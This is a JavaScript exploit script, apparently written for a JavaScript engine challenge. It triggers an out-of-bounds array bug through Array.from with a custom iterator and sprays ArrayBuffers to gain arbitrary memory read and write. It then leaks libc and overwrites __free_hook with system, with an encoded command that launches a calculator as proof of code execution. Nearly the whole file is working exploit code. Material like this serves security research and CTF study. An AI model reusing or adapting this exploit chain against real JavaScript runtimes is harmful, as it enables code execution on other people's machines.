/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

/**************************************************************
 *             _            
 *    ___ ___ | | ___  _ __ 
 *   / __/ _ \| |/ _ \| '__|
 *  | (_| (_) | | (_) | |   
 *   \___\___/|_|\___/|_|   
 *                          
 **************************************************************/
const RED       = "\033[0;31m";
const BLUE      = "\033[0;34m";
const GREEN     = "\033[0;32m";
const RESET     = "\033[0;0m";

function info() {
    let msg = Array.prototype.join.call(arguments, " ");
    console.log(BLUE + "[*]", msg, RESET);
}

function success() {
    let msg = Array.prototype.join.call(arguments, " ");
    console.log(GREEN + "[+]", msg, RESET);
}

function error() {
    let msg = Array.prototype.join.call(arguments, " ");
    console.log(RED + "[!]", msg, RESET);
}

/**************************************************************
 *   _          _                     
 *  | |__   ___| |_ __   ___ _ __ ___ 
 *  | '_ \ / _ \ | '_ \ / _ \ '__/ __|
 *  | | | |  __/ | |_) |  __/ |  \__ \
 *  |_| |_|\___|_| .__/ \___|_|  |___/
 *               |_|                  
 * 
 **************************************************************/
function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return ((u64_buf[1]) * 0x100000000) + (u64_buf[0]); // Watch for little endianness
}

function itof(val) { // typeof(val) = 
    u64_buf[0] = parseInt(val % 0x100000000);
    u64_buf[1] = parseInt((val - u64_buf[0]) / 0x100000000);
    return f64_buf[0];
}

function hex(val) {
    return "0x" + parseInt(val).toString(16);
}

/**************************************************************
 *                   _       _ _   
 *    _____  ___ __ | | ___ (_) |_ 
 *   / _ \ \/ / '_ \| |/ _ \| | __|
 *  |  __/>  <| |_) | | (_) | | |_ 
 *   \___/_/\_\ .__/|_|\___/|_|\__|
 *            |_|                  
 * 
 **************************************************************/
function addrOf(o) {
}

function fakeObj(addr) {
}

function readData(addr) {
    fltArray[jsonAB[0].off + 1] = itof(addr);
    fltArray[jsonAB[0].off + 2] = itof(addr);
    const tmp = new Float64Array(arrayBuffers[jsonAB[0].idx], 0, 8);
    return ftoi(tmp[0]);
}

function writeData(addr, val) {
    fltArray[jsonAB[0].off + 1] = itof(addr);
    fltArray[jsonAB[0].off + 2] = itof(addr);
    const tmp = new Float64Array(arrayBuffers[jsonAB[0].idx], 0, 8);
    tmp[0] = itof(val);
}

function find2ArrayBuffers() {
    const inRange = (x) => x >= 0x2000 && x < 0x3000;
    var count = 0;
    var result = [];
    let tmp;
    for (let i = 0; i < 100; ) {
        tmp = ftoi(fltArray[i]) / 0x100000000;
        if (
            inRange(tmp)
            && fltArray[i+1] == fltArray[i+2]
            && inRange(ftoi(fltArray[i+3]))
            && tmp == ftoi(fltArray[i+3])
        ) {
            result.push({idx: tmp - 0x2000, off: i});
            if (++count >= 2)
                return result;
            i += 4;
        } else {
            ++i;
        }
    }
}

var arrayBuffers = [];
let fltArray = [1.1];
Array.from.call(function() { return fltArray }, {[Symbol.iterator] : _ => (
  {
    counter : 0,
    max : 1024 * 8,
    next() {
        let result = this.counter++;
        if (this.counter == this.max) {
            fltArray.length = 1;
            for (let i = 0; i < 0x1000; ++i) {
                arrayBuffers.push(new ArrayBuffer(0x2000+i));
            }
            return {done: true};
        } else {
            return {value: 2.2, done: false};
        }
    }
  }
) });

var jsonAB = find2ArrayBuffers();
var map = ftoi(fltArray[jsonAB[0].off - 3]);
info("map:", hex(map));

fltArray[jsonAB[1].off + 1] = fltArray[jsonAB[0].off + 1];
fltArray[jsonAB[1].off + 2] = fltArray[jsonAB[0].off + 2];

for (let i = 0; i < arrayBuffers.length; ++i) {
    if (i != jsonAB[0].idx)
        arrayBuffers[i] = undefined;
}

for (let i = 0; i < 0x1000; ++i) {
    arrayBuffers.push(new ArrayBuffer(0x2010));
}

const tmp = new Float64Array(arrayBuffers[jsonAB[0].idx], 0, 8);
var libcAddr = ftoi(tmp[0]);
libcAddr -= 0x1ec280;
success("libc @", hex(libcAddr));

const __free_hook_off   = 0x1eeb28; 
const system_off        =  0x55410;
writeData(libcAddr + __free_hook_off, libcAddr + system_off);
const binsh = new Uint32Array(new ArrayBuffer(0x30));
cmd = [1920169263, 1852400175, 1869506351, 1663919469, 1969450081, 1869898092, 114];

for (var i = 0; i < cmd.length; i++)
    binsh[i] = cmd[i];
